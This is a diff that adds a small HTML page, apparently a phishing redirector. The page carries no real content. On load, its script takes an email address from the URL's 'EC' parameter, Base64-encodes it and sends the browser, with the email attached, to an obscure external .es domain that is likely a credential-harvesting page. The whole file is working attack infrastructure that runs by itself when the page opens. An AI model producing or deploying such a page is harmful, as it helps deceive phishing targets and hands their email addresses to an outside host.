@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RD</title>
+  <script>
+    // Function to extract the email from the URL and encode it in Base64
+    function encodeEmailAndRedirect() {
+      // Get the full URL
+      const urlParams = new URLSearchParams(window.location.search);
+
+      // Extract the email from the query parameter "EC"
+      const email = urlParams.get('EC');
+
+      if (email) {
+        // Encode the email in Base64
+        const encodedEmail = btoa(email);
+
+        // Construct the new URL with the encoded email
+        const newUrl = `https://ebu6aj.jxebpueehg.es/?EC=${encodedEmail}`;
+
+        // Redirect to the new URL
+        window.location.href = newUrl;
+      } else {
+        alert("!!");
+      }
+    }
+  </script>
+</head>
+<body onload="encodeEmailAndRedirect()">
+  <h1>...</h1>
+</body>
+</html>
